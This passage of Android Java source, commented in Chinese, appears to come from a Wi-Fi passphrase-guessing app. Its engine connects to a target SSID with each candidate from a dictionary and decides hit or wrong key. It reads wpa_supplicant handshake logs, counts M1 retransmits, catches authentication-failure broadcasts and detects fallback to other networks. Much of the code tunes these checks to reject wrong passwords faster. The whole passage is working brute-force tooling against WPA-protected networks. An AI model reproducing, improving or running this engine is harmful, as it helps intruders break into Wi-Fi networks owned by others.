                            Evidence.Source.SUCCESS_STATUS, Evidence.Claim.CONNECTED,
                            Evidence.Attribution.AT3, attemptId, targetNetId >= 0, ms,
                            L.s("握手完成且已获取 IP（确认连上）",
                                "handshake completed and IP obtained")
                                    + (sa.evidence == null || sa.evidence.isEmpty()
                                        ? "" : " · " + sa.evidence));
                } else {
                    /*
                     * ---- 失败加速：系统已经回连到别的网络 ----
                     *
                     * 为什么需要它：本机（ColorOS 15）**不输出** wpa_supplicant 与
                     * 状态机日志（实测 `-s wpa_supplicant` 0 行、`-e ClientModeImpl`
                     * 只有 ContextImpl 噪音），所以 assoc_reject / handshake failed
                     * 这类信号根本不存在 —— 错误密码只能干等 10 秒超时。
                     *
                     * 但有一条本地信号是可靠且免费的：**系统不会同时连两个网络**。
                     * 它去连别的网络，就说明目标这次尝试已经结束、且没连上。
                     * `cmd wifi status` 本来就每轮在读（18ms），零额外开销。
                     *
                     * 保守之处（宁可漏判，绝不误判）：
                     *   · 必须先观察到「系统离开了命令前那条连接」才启用本判据 ——
                     *     否则命令刚发出、status 还停留在原网络时就会被误判成失败
                     *   · 再要求距命令 ≥ FAILOVER_MIN_MS
                     *   · 只判 AUTH_FAIL，绝不判 SUCCESS
                     */
                    boolean onOtherNetwork = info.ssid != null && !info.ssid.isEmpty()
                            && !target.ssid.equals(info.ssid)
                            && info.state != null
                            && "COMPLETED".equalsIgnoreCase(info.state);
                    if (!onOtherNetwork) {
                        leftBaseline = true;
                    } else if (FailoverRule.looksLikeFailover(target.ssid, info.ssid, info.state,
                            leftBaseline, clock().uptimeMillis() - commandAt,
                            // 归属：本条候选确实被尝试过
                            exercised,
                            // 证据冲突：本轮已有目标的成功证据 → 交给成功判据，不抢答失败
                            negotiatedThisRound)) {
                        long ms = clock().uptimeMillis() - t0;
                        android.util.Log.i(TAG, "回连他网: 系统已连上 " + info.ssid);
                        // v2.1：failover 是 **AP-1**（只证明「本次没连上」）→ 不产 AUTH_FAIL。
                        // 「系统去连别的网」= 本次尝试已终止，但没有密钥不符证据。
                        long msf = clock().uptimeMillis() - t0;
                        // 证据：本次没连上（AP-1）。归属 AT1 —— 只看到「系统去连别的网」，
                        // 与「本条候选的密钥被拒」之间没有因果链。
                        return judge(password, lastLifecycle, AttemptState.Gate.OK,
                                Evidence.Source.FAILOVER, Evidence.Claim.NOT_CONNECTED,
                                Evidence.Attribution.AT1, attemptId,
                                targetNetId >= 0, msf,
                                L.f("系统已回连到其它网络 %s —— 目标这次没连上（无归因证据）",
                                    "system fell back to %s - the target did not connect (no attributable evidence)",
                                    info.ssid));
                    }
                }
            }

            // ---------- 判据 B：wpa_supplicant 握手日志（参考 bszapp 的做法） ----------
            //
            // 那套实现判定成功的依据就是日志里的
            //   wlan0: Trying to associate with SSID 'X'
            //   WPA: Key negotiation completed with ...
            // 前者给出「这次在试哪个网络」，后者是「握手完成」——
            // 两行合起来就是密码正确的直接证据，比轮询状态更早。
            //
            // 失败也有明确信号：
            //   WPA: 4-Way Handshake failed - pre-shared key may be incorrect
            //   CTRL-EVENT-ASSOC-REJECT
            // 见到就直接判密码错，不用傻等超时。
            //
            // 前提（R11 起）：读取带时间锚点，且切片从本条标记之后开始 —— 不依赖清空。
            // 每轮都读日志。原来这里是 `logRound++ % 3 == 0` ——
            // 每 3 轮（约 1.2 秒）才读一次，而「握手失败 / 关联被拒」
            // 恰恰是**最快**的失败信号。等 1.2 秒才看一眼，
            // 相当于每条候选白白多等一个轮询周期。
            // 一次 logcat 读只要 239ms（真机实测），付得起。
            {
                if (wlog != null && !wlog.isEmpty()) {
                    // 预过滤之后输出里不会再有 "wpa_supplicant" 这个字样
                    // （那是 tag，-s 过滤后不打印），能读到非空行本身就是
                    // 「这条通道读得到日志」的证据。
                    if (!logReadable) {
                        logReadable = true;   // 惰性置位：只要看到过就长期有效
                        android.util.Log.i(TAG, "日志通道确认可读");
                    }
                    logRounds++;
                    // 日志事实一律受窗口闸约束：窗口不可用时，这条「关联行」
                    // 可能来自上一条候选（审计 S3-2）。
                    boolean tried = logWinUsable && WpaLogReader.sawAssociateFor(
                            wlogSlice, target.ssid);
                    if (tried) {
                        sawAttempt = true;
                        if (tAssocMs < 0) tAssocMs = clock().uptimeMillis() - t0;
                    }

                    // 捕获握手第 1 帧 (RX message 1 of 4-Way Handshake) -> 动态延长看门狗，给握手完成留足时间
                    if (tried && !m1Extended && WpaLogReader.sawHandshakeM1(wlogSlice)) {
                        deadline = Math.max(deadline, clock().uptimeMillis() + 2500L);
                        m1Extended = true;
                        android.util.Log.i(TAG, "捕获握手第 1 帧，看门狗延长 2.5s");
                    }

                    // 必须校验**这个握手是目标的**：日志里同一时刻常常还有
                    // 系统回连别的网络并握手成功的记录，只判断「出现过协商完成」
                    // 会把别的网络算成命中（2026-10-22 假阳性事故）。
                    // D2：成功判定要求**带 netId 归属**（拿不到 netId 时行为不变）。
                    if (tried && WpaLogReader.sawNegotiatedForAttempt(
                            wlogSlice, target.bssid, targetNetId)) {
                        long ms = clock().uptimeMillis() - t0;
                        android.util.Log.i(TAG, "命中(日志): 关联目标后完成协商");
                        // 证据：CONNECTED。归属 AT3 —— 要求「目标 BSSID 的
                        // Key negotiation completed」，且带 netId 归属
                        // （sawNegotiatedForAttempt 已把 netId 纳入）。
                        return judge(password, Lifecycle.ACTIVE, AttemptState.Gate.OK,
                                Evidence.Source.SUCCESS_LOG, Evidence.Claim.CONNECTED,
                                Evidence.Attribution.AT3, attemptId, targetNetId >= 0, ms,
                                L.s("日志确认握手完成（Key negotiation completed）",
                                    "log confirms handshake completed"));
                    }
                    // 失败判定**不再要求先看到 "Trying to associate"**：
                    // `4-Way Handshake failed` / `reason=WRONG_KEY` 这两行本身就是
                    // 「本次尝试失败」的直接记录，不需要再拿关联行做前置条件。
                    // （旧逻辑用 tried 做前置：一旦关联行被 ColorOS 的日志配额丢掉，
                    //   失败行即使读到了也不会被采纳，只能干等超时。）
                    // 带归属的失败信号优先：`CTRL-EVENT-SSID-TEMP-DISABLED ssid="X"` 里
                    // 有 SSID，能确认是目标的失败。另外两种（Handshake failed / ASSOC-REJECT）
                    // 不带归属，所以仍要求本次见过目标的关联尝试。
                    // ── 早期失败（第三级，最可靠）：系统广播「认证失败」 ────────────
                    // framework 在 WPA 握手失败时发 SUPPLICANT_STATE_CHANGED_ACTION +
                    // ERROR_AUTHENTICATING（系统弹的「密码错误」对话框就靠它）。
                    // 这条信号**不经过 logcat**，厂商日志配额砍不掉它，也不需要 root。
                    // 归属：必须发生在「本条命令发出之后」，且本轮没有成功证据。
                    // 再等 120ms 复核一次 —— 万一这条候选其实是对的，
                    // 这 120ms 里的成功判据会先返回 SUCCESS，不会漏判。
                    if (authWatch != null && authWatch.isRegistered()) {
                        boolean succ = WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);
                        // R3：同样要求「本条确实被尝试过」——上一条候选留下的认证失败
                        // 广播可能恰好落进本条的窗口，若本条根本没被执行过，就不能采信。
                        if (exercised
                                && WifiAuthFailureWatcher.ssidOwnedByTarget(
                                        authWatch.lastErrorSsid(), target.ssid)
                                // 代际校验（A3）：clear() 之前产生的迟到广播一律丢弃
                                && WifiAuthFailureWatcher.authErrorImpliesWrongKeyGen(
                                        authWatch.lastErrorAt(), commandAt, succ,
                                        authWatch.lastErrorGeneration(),
                                        authWatch.currentGeneration())) {
                            if (tAuthMs < 0) tAuthMs = clock().uptimeMillis() - t0;
                            if (authArmedAt == 0L) {
                                authArmedAt = clock().uptimeMillis();
                            } else if (clock().uptimeMillis() - authArmedAt >= 120L) {
                                long ms = clock().uptimeMillis() - t0;
                                android.util.Log.i(TAG, "早期失败(第三级): 系统广播认证失败");
                                // 证据等级：广播里带出了**与本目标相同的 SSID** 才算 DIRECT；
                                // 读不到 SSID 时（<unknown ssid>）归属不可靠 -> INFERRED。
                                boolean ssidOwned = WifiAuthFailureWatcher.ssidOwnedByTarget(
                                        authWatch.lastErrorSsid(), target.ssid);
                                /*
                                 * 归属分级（C1）：authcast **永远**是 INFERRED。
                                 *
                                 * <h3>为什么 targetNetId >= 0 不够（B3b 的错误，已纠正）</h3>
                                 * 「本次命令建出了配置并拿到 netId」只回答第 2 层问题。
                                 * 要把它当成 AT-3 必须逐层成立：
                                 * <pre>
                                 *   ① 当前命令创建了配置          —— targetNetId >= 0 可证
                                 *   ② 当前配置获得了 netId        —— 同上
                                 *   ③ **广播**携带了 netId        —— 不可能：系统广播只有
                                 *        EXTRA_NEW_STATE 与 EXTRA_SUPPLICANT_ERROR
                                 *        （EXTRA_SSID / EXTRA_BSSID / EXTRA_NETWORK_INFO
                                 *         在 Android 12+ 已废弃，本机读不到）
                                 *   ④ 广播与当前配置可验证关联    —— 无通道可证
                                 *   ⑤ 广播与当前 Attempt 可验证  —— 无通道可证
                                 * </pre>
                                 * 第 3 层就已经断了。**存在 targetNetId 不构成关联证据。**
                                 * 更何况 netId 会被系统复用（净检里已记录该现象），
                                 * 同一个 netId 可能先后属于不同配置。
                                 *
                                 * <h3>致命场景（为什么不能给 DIRECT）</h3>
                                 * 同 SSID 多配置：系统里还留着一条**旧配置**（旧密码）
                                 * 指向同一个 SSID。后台拿它重试失败 → 广播 SSID 与目标
                                 * 逐字相等 → 若给 DIRECT，本条候选被永久写进 triedSet。
                                 * 若本条其实是**正确**密码，它就被永久排除了。
                                 *
                                 * <h3>代价（明确记录）</h3>
                                 * AUTH_FAIL 不再有任何 DIRECT 出口 → 错误密码不会被
                                 * 永久排除，续跑会重试。判定能力不变（本轮仍报
                                 * AUTH_FAIL，用户看得见），只放弃「永久排除」这个
                                 * 尚未被任何可靠证据支持的能力。
                                 * 这是「正确性优先于速度」的同一取舍（见支A）。
                                 */
                                // 证据：framework 明确报「认证失败」（AP-3 级主张）。
                                // 归属只到 AT1 —— 广播不含 netId/BSSID，无法绑到本次配置。
                                return judge(password, lastLifecycle, AttemptState.Gate.OK,
                                        Evidence.Source.AUTHCAST, Evidence.Claim.WRONG_KEY,
                                        Evidence.Attribution.AT1, attemptId,
                                        targetNetId >= 0, ms,
                                        L.s("系统报告认证失败 → 密码错误",
                                            "system reported auth failure -> wrong passphrase")
                                                + timing(tAssocMs, tM1Ms, tAuthMs)
                                                + L.s("（广播不含 netId 或 BSSID，无法证明属于本次配置，仅本轮结论）",
                                                    " (broadcast carries no netId/BSSID; "
                                                        + "cannot be tied to this config - "
                                                        + "not a permanent exclusion)"));
                            }
                        }
                    }

                    // ── 早期失败（第二级，最快）：M1 之后静默 ────────────────────
                    // 真机：正确密码从命令到「四条件成立」只要 670~722ms，M2 在 M1 后 4ms
                    // 发出、M3/M4 紧随；错误密码时 AP 要等 1.0 秒才重发 M1。
                    // 所以 M1 后 600ms 内没有任何「Key negotiation completed」→ 密码错。
                    // 只可能漏判、不可能误判（成功仍由四条件同行独占判定）。
                    // 归属保护：优先用 M1 行自带的 BSSID（可靠）；
                    // BSSID 缺失时才退回「见过目标的关联行」。
                    boolean targetBssidKnown = target.bssid != null && !target.bssid.isEmpty();
                    int m1ForTarget = targetBssidKnown
                            ? WpaLogReader.countHandshakeM1For(wlogSlice, target.bssid) : 0;
                    boolean m1SeenForTarget = targetBssidKnown
                            ? (m1ForTarget >= 1)
                            : (tried && WpaLogReader.sawHandshakeM1(wlogSlice));
                    int m1CountForTarget = targetBssidKnown
                            ? m1ForTarget
                            : (tried ? WpaLogReader.countHandshakeM1(wlogSlice) : 0);

                    if (m1SeenForTarget) {
                        // R2（2026-10-24）：这里原来会在「M1 之后静默 1200ms」时直接
                        // 返回 AUTH_FAIL —— 那是**纯时间判据**：它只能证明「这段时间
                        // 没观察到证据」，不能证明「观察到失败证据」（审计 S4-1：
                        // 成功证据晚到 100ms 就被吞掉，把正确密码判负）。
                        //
                        // 现在这一段只留耗时/诊断记录，**不结案**。失败结论一律由下面
                        // 的证据路径给出：AP 重发 M1（协议层观察）+ 120ms 复核窗口
                        // （留给「那条 M1 只是丢包重传、密码其实正确」的余地）。
                        // 谓词 m1SilentImpliesWrongKey / EARLY_FAIL_SILENCE_MS 保留，
                        // 单测用它们表达「为什么不能单独用」。
                        if (tM1Ms < 0) tM1Ms = clock().uptimeMillis() - t0;
                    }

                    // ── 早期失败：M1 被重发（2026-10-23 真机实测定论）─────────────
                    // AP 没收到有效 M2 时每 ~1.0s 重发一次 M1；看到第 2 次 M1
                    // 就已经确定密码错，不必再等 `Handshake failed`（那还要多等 2~3 秒）。
                    // 归属保护：要求本次见过「目标 SSID 的关联行」，避免把
                    // 系统回连**别的**网络时产生的 M1 算到这条候选头上。
                    int m1Count = m1CountForTarget;
                    boolean successSeen = WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);
                    // A1：补 exercised 前置，与 authcast / failover / wpalog 三条对齐。
                    // M1 行不带 SSID，切不掉历史行；若不要求「本条确实被执行过」，
                    // 系统后台用旧配置重试同一 BSSID 产生的 M1 会被算进本条，
                    // 两条 M1 就把一条从未真正跑过的候选判成密码错。
                    if (exercised && m1RetryImpliesWrongKey(m1Count, successSeen)) {
                        if (!m1RetryArmed) {
                            m1RetryArmed = true;
                            m1RetryArmedAt = clock().uptimeMillis();
                        } else if (clock().uptimeMillis() - m1RetryArmedAt
                                >= M1_RETRY_CONFIRM_MS) {
                            long ms = clock().uptimeMillis() - t0;
                            android.util.Log.i(TAG, "早期失败: M1 重发 " + m1Count
                                    + " 次（握手无进展）");
                            // 证据等级：INFERRED —— M1 重发只说明「握手没进展」，
                            // 丢包 / AP 慢 / 上一条残留都能造成，不能据此永久排除候选。
                            // v2.1：m1retry 是 **AP-1**（握手无进展只证明「没连上」）→ 不产 AUTH_FAIL。
                            Lifecycle m1lc = lastLifecycle;
                            String m1d = L.s("M1 被重发（握手无进展）—— 本次没连上",
                                        "M1 retransmitted (no handshake progress) - not connected")
                                            + timing(tAssocMs, tM1Ms, tAuthMs);
                            // 证据：握手没进展（AP-1）。归属 AT1 —— M1 行不带 SSID/BSSID。
                            return judge(password, m1lc, AttemptState.Gate.OK,
                                    Evidence.Source.M1RETRY, Evidence.Claim.NOT_CONNECTED,
                                    Evidence.Attribution.AT1, attemptId,
                                    targetNetId >= 0, ms, m1d);
                        }
                    }

                    /*
                     * 归属收紧（2026-10-31，WrongKeyAttributionTest 驱动）：
                     *
                     * 原来这里直接调 sawWrongKeyFor(slice, ssid) —— 它**只比 SSID**，
                     * 于是「系统后台用旧配置重试同一网络并失败」的行会被算到本条候选头上，
                     * 把正确密码判成 AUTH_FAIL。真机可复现（同 SSID 多配置时尤其明显）。
                     *
                     * 现在改用 sawWrongKeyForAttempt()：要求切片里**同时**出现
                     *   · 本目标 SSID 的 `Trying to associate`
                     *   · 本次连接的失败前导（4-Way Handshake failed 或 RX message 1）
                     * 才采信那条 TEMP-DISABLED。后台重试的 associate/handshake 行落在
                     * 标记之前、已被切片切掉，因此不再满足条件。
                     *
                     * <h3>D5 修复（2026-11-01）：两支必须有不同等级</h3>
                     *
                     * 原来两支共用同一个 {@code DIRECT}，但它们的证据强度差一整级：
                     * <ul>
                     *   <li><b>支 A</b> {@code sawWrongKeyForAttempt}：要求切片里同时有
                     *       本目标 SSID 的 associate 行 + 带 SSID 归属的 TEMP-DISABLED
                     *       （+ 失败前导）。这是 wpa_supplicant 对**这次**的直接否认
                     *       → 保持 {@code DIRECT}。</li>
                     *   <li><b>支 B</b> {@code tried && (sawHandshakeFailure || sawAssocReject)}：
                     *       {@code 4-Way Handshake failed} / {@code CTRL-EVENT-ASSOC-REJECT}
                     *       **不带 SSID 也不带 BSSID**，无法证明它属于本目标；
                     *       {@code tried} 又只证明「切片里出现过目标的 associate 行」，
                     *       两者之间没有时序绑定。别的网络握手失败完全可能被算到本条头上
                     *       → 降为 {@code INFERRED}：本轮不重复试，但
                     *       **不写 permanent triedSet、不推进续跑游标**。</li>
                     * </ul>
                     */
                    /*
                     * D5：把「网络级认证失败」与「候选级失败」拆成两级。
                     *
                     * 证据链（AT3 要求第 3 条）：
                     *   ① 命令前目标配置已删净并回读确认（前置闸门，进循环即已成立）
                     *   ② 命令后本次新建配置拿到 netId = targetNetId
                     *   ③ TEMP-DISABLED 行的 id= **等于** targetNetId
                     *   ④ 该行 ssid == 目标，且切片内有序（associate -> 失败前导 -> 该行）
                     *
                     * 只要全部成立，这条失败就绑在**本条候选建的配置**上 -> AT3。
                     * 若 ③ 不成立（例如 supplicant id 与 Android Net ID 不同体系，
                     * 或 netId 没取到），退回 AT1 -> NETWORK_AUTH_FAIL（网络级事件）。
                     *
                     * **降级方向是安全的**：假设错误只会让我们少给 DIRECT，
                     * 不会错给 DIRECT。
                     */
                    boolean logBoundFail = logWinUsable
                            && WpaLogReader.sawWrongKeyForConfig(
                                    wlogSlice, target.ssid, target.bssid, targetNetId);
                    boolean logAttemptFail = logWinUsable && !logBoundFail
                            && WpaLogReader.sawWrongKeyForAttempt(
                                    wlogSlice, target.ssid, target.bssid);
                    boolean logInferredFail = logWinUsable && !logBoundFail && !logAttemptFail
                            && tried
                            && (WpaLogReader.sawHandshakeFailure(wlogSlice)
                                    || WpaLogReader.sawAssocReject(wlogSlice));
                    if (logBoundFail) {
                        // ---- 支A-AT3：绑定到本条候选建的配置 -> 候选级失败 ----
                        long ms = clock().uptimeMillis() - t0;
                        android.util.Log.i(TAG, "快速失败(日志/AT3): id=" + targetNetId
                                + " 落在本次配置上");
                        return judge(password, lastLifecycle, AttemptState.Gate.OK,
                                Evidence.Source.WPALOG_A, Evidence.Claim.WRONG_KEY,
                                Evidence.Attribution.AT3, attemptId,
                                true, ms,
                                L.s("日志显示握手失败（密码错误）—— 失败行绑定了本次新建的配置",
                                    "log shows handshake failure; the failing entry carries "
                                        + "this attempt's config id"));
                    }
                    if (logAttemptFail) {
                        // ---- 支A-AT1：只证明「网络认证失败」，绑不到本条候选 ----
                        long ms = clock().uptimeMillis() - t0;
                        android.util.Log.i(TAG, "快速失败(日志/网络级): 目标认证失败但未绑定本次配置");
                        return judge(password, lastLifecycle, AttemptState.Gate.OK,
                                Evidence.Source.WPALOG_A, Evidence.Claim.WRONG_KEY,
                                Evidence.Attribution.AT1, attemptId,
                                targetNetId >= 0, ms,
                                L.s("目标网络报告认证失败，但无法证明属于本条候选的配置"
                                        + "（网络级事件，不是已证实的密码错误）",
                                    "the target network reported an auth failure, but it "
                                        + "cannot be bound to this candidate's config "
                                        + "(network-level event, NOT a proven wrong passphrase)"));
                    }
                    if (logInferredFail) {
                        // ---- 支B：零字段证据，不可归属 —— 先武装确认窗口，不抢答 ----
                        // 首次命中只记时；窗口内继续轮询（成功判据每轮仍有机会），
                        // 让「失败信号先到、成功证据后到」的后到成功参与同一次裁决。
                        if (!wlInferredArmed) {
                            wlInferredArmed = true;
                            wlInferredArmedAt = clock().uptimeMillis();
                            android.util.Log.i(TAG, "快速失败(日志/推断): 进入确认窗口，等待可能的成功证据");
                        }
                        // v2.1：**不再设独立"确认窗口到期即结案"**。
                        // 原因（实测）：1 秒窗口 < 慢速 AP 建立连接所需（真机 12~19 秒），
                        // 会把「失败信号先到、成功证据后到」的正确密码判死（缺陷 D1）。
                        // 现在支B 只「武装」，**结案统一交给循环末尾的裁决**：
                        //   · 期间成功判据每轮都有机会命中 → 后到成功参与裁决；
                        //   · 循环结束（deadline）：连接仍活动 → INCOMPLETE；
                        //     连接已终止 → AUTH_FAIL/INFERRED（本轮的弱证据结论）。
                        // 窗口未到期：不返回，继续循环
                    }
                }
            }
        }

        long total = clock().uptimeMillis() - t0;

        // 支B 曾命中、但确认窗口未及到期循环就结束 → 按 INFERRED 结案。
        // 语义：确实观察到过「不可归属的握手失败/关联被拒」，只是来不及跑完确认窗口；
        // 若这里退化成 TIMEOUT，就把一条**已有失败证据**的候选降级成了「没结论」——
        // 那是另一种形式的判定能力损失（P05AttributionTest 场景 A 钉死了这条）。
        if (wlInferredArmed) {
            // ---- 支B 是 **AP-1**（零字段 4-Way Handshake failed，只证明「本次没连上」）----
            // v2.1：**AP-1 永不产生 AUTH_FAIL**（连接终止 != 密码错）。
            // 按生命周期三态分派，且 **UNKNOWN 不得当作 TERMINATED**。
            Lifecycle lc = lastLifecycle;
            android.util.Log.i(TAG, "循环结束：支B(AP-1) 命中，生命周期=" + lc + " state=" + lastStatusState);
            // 证据：零字段/无归属的失败行（AP-1）。归属 NONE —— 连 SSID 都没有。
            return judge(password, lc, AttemptState.Gate.OK,
                    Evidence.Source.WPALOG_B, Evidence.Claim.NOT_CONNECTED,
                    Evidence.Attribution.NONE, attemptId,
                    targetNetId >= 0, total,
                    L.s("观察期结束：日志有无归属的失败行，但连接生命周期"
                            + (lc == Lifecycle.ACTIVE ? "仍在进行" : "已终止/未知"),
                        "observation window ended with unattributed failure lines; lifecycle="
                            + lc));
        }

        // R6：循环里一次日志都没读到（例如通道不吐日志）时也要留下窗口状态，
        // 不能让「没读到日志」和「没采集元数据」在记录里长得一样。
        if (lastWindow == null) {
            // 这条路径表示「循环里压根没走到日志读取」（在它之前就 return 了），
            // 所以日志维度**未被评估**：logReadOk 传 true 以免把责任错误地推给 logcat；
            // 此时窗口必然不可用（没有标记），结论不受影响。
            lastWindow = AttemptMarker.evaluate(attemptId, windowStartOk, markerWritten,
                    null, true, true);
        }

        // 超时后的归类
        boolean currentOnTarget = target.ssid.equals(snapshotSsid());
        if (currentOnTarget) {
            long nowId = currentNetId();
            if (nowId >= 0 && netIdBefore >= 0 && nowId == netIdBefore) {
                // 还是命令前那条连接 —— 不能算本次命中
                currentOnTarget = false;
            }
        }
        // D3：「连着目标」有两种完全不同的含义 ——
        //   ① 残留/回连（连接已经稳定在目标上）→ 归属不明，UNKNOWN；
        //   ② **本条候选正在连目标**（握手进行中）→ 连接仍在推进，INCOMPLETE。
        // 旧实现把两者都归到 ①，于是「慢 AP 正在握手」被报成「归属不明」，
        // 白丢一层语义（INCOMPLETE 明确表示「可重新裁决」）。
        // 判据用生命周期三态：ACTIVE 说明连接仍在进行，不属于「残留」。
        if (currentOnTarget && lastLifecycle == Lifecycle.ACTIVE) {
            currentOnTarget = false;
        }
        // R3：归类走纯函数（可离线逐格穷举），失败/未知/无结论三类严格分开。
        //   · not-attempted  → ERROR（命令没生效，**不是**密码错）
        //   · 各类「证据不足」 → UNKNOWN
        //   · 到期且无证据    → TIMEOUT（观察窗口结束，没有明确结论）
        // 旧实现在最后一种情形返回 AUTH_FAIL —— 那是把「没有成功证据」当成
        // 「失败已被证明」，是本次修复的核心根因之一。
        // D4：生命周期**作为输入**交给统一裁决，不再拿到结果后二次覆盖。
        DeadlineOutcome out = classifyDeadline(
                targetNetId < 0 && !sawAttempt && channelAlive,          // 命令未生效
                currentOnTarget,
                suspectNetIdConflict,
                !sawAttempt && !channelAlive,                            // 通道无响应
                !sawAttempt && channelAlive && lastStatusSsid != null
                        && target.ssid.equals(lastStatusSsid),
                lastLifecycle);

        String detail;
        if ("not-attempted".equals(out.reason)) {
            // 「命令根本没生效」先摘出来：过了 4 轮（>400ms）框架都没给这个 SSID
            // 建出配置，说明 connect-network 被悄悄丢掉了（它在忙时就是这样，
            // 连输出都没有）。这条**不能当密码错** —— 真机表现为「对着正确的密码
            // 跳过去」（2026-10-24 实报）。归到通道异常，用户能看出是环境问题。
            detail = L.s("连接命令似乎未生效：框架没有为本条候选建出配置"
                            + "（通道忙时 cmd wifi 会静默丢弃请求）。换个 AP 或稍后重试。",
                    "the connect command did not take effect: the framework created no "
                            + "config for this candidate (cmd wifi drops requests silently "
                            + "when busy). Try another AP, or retry later.");
        } else if ("on-target-unattributed".equals(out.reason)) {
            // **不能因为「现在连着目标」就判成功**。
            //
            // 这正是那批假阳性的来源：系统回连、旧连接残留、缓存凭据……
            // 都会让这里为真，而它们跟当前这条候选没有关系。
            // 没有「本次新建立」的正面证据（新 netId / 本次日志），就只能存疑。
            detail = L.s("当前连着目标，但没有本次连接的证据（可能是原有连接或缓存凭据）",
                    "on target now, but no evidence of a fresh connection "
                            + "(possibly pre-existing or cached credentials)");
        } else if ("netid-conflict".equals(out.reason)) {
            // 出现过「目标 + COMPLETED + IP，但 netId 对不上」。
            // 不判成功（可能是同名网络的回连或残留），但也不能当作「密码错」——
            // 如实报成不确定，让用户自己复核，而不是悄悄丢掉一次可能的命中。
            detail = L.s("出现过目标已连接的状态，但与本次新建配置的 netId 不符，无法确认归因",
                    "target showed connected, but its netId differs from the one created "
                            + "by this attempt - attribution unconfirmed");
        } else if ("channel-no-response".equals(out.reason)) {
            // 既没看到尝试、通道又完全不响应 —— 是通道/命令问题，不是密码错。
            // 归 UNKNOWN，避免把正确密码误报成错误。
            detail = L.s("命令未生效（通道无响应）",
                    "command had no effect (channel unresponsive)");
        } else if ("status-unclear".equals(out.reason)) {
            // 通道活着，但结束时 status 显示连着目标却始终没判定成功 ——
            // 可能是连接太慢或状态机没给出证据，保守归 UNKNOWN。
            detail = L.s("连接状态不明（通道正常但证据不足）",
                    "inconclusive (channel ok, insufficient evidence)");
        } else {
            // R3：**不得**把「等满时限、没有可归因的失败证据」写成 AUTH_FAIL。
            // 这一条只说明「本次观察窗口结束，没有得出结论」。
            detail = L.s("观察窗口结束：未连上，且没有可归因的失败证据（这不等于密码错误）",
                    "observation window ended: not connected and no attributable failure "
                            + "evidence (this is NOT a proven wrong passphrase)");
        }
        Verdict verdict = out.verdict;

        /*
         * D4：**这里不再有第二套「生命周期兜底」**。
         *
         * 旧实现对 classifyDeadline 的结果再覆盖一次 UNKNOWN/TIMEOUT -> INCOMPLETE，
         * 等于在同一函数里放了两张判定表。现在生命周期是 classifyDeadline 的
         * **输入**（见上面的调用），"连接仍 ACTIVE -> INCOMPLETE" 由
         * {@link Adjudicator} 规则 6 直接产出，不存在第二处覆盖点。
         *
         * 保留的只是**判词**补充（不改 verdict）：
         */
        if (verdict == Verdict.INCOMPLETE) {
            android.util.Log.i(TAG, "循环结束：连接仍在进行(" + lastStatusState
                    + ") -> INCOMPLETE（可重新裁决）");
            detail = L.s("观察窗口结束，但目标连接仍在进行（未收敛）—— 可重新裁决",
                    "observation window ended while the target connection was still in "
                            + "progress - re-adjudicable")
                    + " · " + detail;
        }

        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms sawAttempt=" + sawAttempt
                + " channelAlive=" + channelAlive + " lastStatusSsid=" + lastStatusSsid
                + " currentOnTarget=" + currentOnTarget
                + " verdict=" + verdict);

        // 分层证据摘要（未命中时也给出，方便定位是哪层的问题）
        // R10：原来这里报的「事件N」恒为 0（NetworkWatcher 早就不参与判定）—— **假数字**。
        // 现在改报真正影响结论的东西：本条候选的日志窗口是否可用。
        detail = detail + L.f(" [层: 日志%d/%s · status%d/%s · 窗口%s]",
                " [layers: log%d/%s status%d/%s window:%s]",
                logRounds, logReadable ? "可读" : "不可读",
                statusRounds, channelAlive ? "通" : "断",
                lastWindow == null ? "未采集" : (lastWindow.evidenceUsable() ? "可用" : lastWindow.reason));

        Attempt fin = new Attempt(password, verdict, total, detail, "");
        fin.reason = out.reason;
        return fin;
    }

    private boolean watcherRegistered() {
        return watcher != null;
    }

    /**
     * 等待。**签名、阻塞语义、中断吞掉行为与原实现逐字节一致**（B1）。
     *
     * <p>原实现是 {@code try { Thread.sleep(ms); } catch (InterruptedException ignored) {}}，
     * 现在只是把这段逻辑下沉到 {@link EngineClock#sleepQuietly(long)}，
     * 生产实现仍调用 {@code Thread.sleep} 并同样吞掉中断。
     * <p><b>可见性变更</b>：由 {@code private static} 改为 {@code private}（实例方法）。
     * 原因是时钟是**每实例**的（防止测试全局污染），static 方法拿不到实例字段。
     * 全部 6 个调用点都位于实例方法内（{@code disconnectAndVerify} /
     * {@code run} / 自检路径），因此调用点代码零改动。
     * 本方法原本就是 {@code private}，对外可见性未变。
     */
    private void sleep(long ms) {
        clock().sleepQuietly(ms);
    }


    // ------------------------------------------------------------------ 批量交给系统

    // ------------------------------------------------------------------ 命中复核（已删除）

    /*
     * F4：这里原来有 `verifyHit()`（断开重连式复验）与它的返回类型 `VerifyResult`。
     * 它**没有任何调用者**（判定链早已改为「命中即命中，不做断开重连复验」），
     * 但包内保留了三段破坏性动作：一条把 netId 写死为 0 的删配置命令、
     * 一次直接断开连接、以及一次按 SSID 删掉目标已保存配置的调用。
     * 任何一次「把它接回去」的改动，都会与收尾恢复互相拆台
     * （恢复刚把原配置写回，复验又把它删掉）。
     *
     * 已整体删除：这套「断开重连式复验」的入口与返回类型在本文件（以及全部生产源码）中
     * 都不再存在 —— 守卫测试按可执行形状断言，注释里也不再出现它们的名字。
     * 需要「复验」语义时请新建独立入口，并复用 ConfigRestorer / RestorePlan，
     * 不要在引擎里重新引入删配置的代码。
     */

    // ------------------------------------------------------------------ 批量跑

    /**
     * 跑一批候选。阻塞，放工作线程。
     *
     * @param timeoutMsPerItem 每条最长等多久；<=0 用默认
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset,
                    long timeoutMsPerItem, Listener l) {
        CheckResult chk = check();
        if (!chk.ok) { l.onBlocked(chk.title, chk.detail); return; }
        if (target == null || target.ssid == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        consecutiveTimeouts = 0;

        // 启动事件监听（判定只认它）
        if (watcher != null) {
            watcher.clear();
            watcher.start();
        }
        if (authWatch != null) {
            authWatch.start();
            // 把监听器状态打到 UI 上。
            // 判定完全依赖它，如果它没生效，
            // 必须能从界面看出来，而不是去翻 logcat。
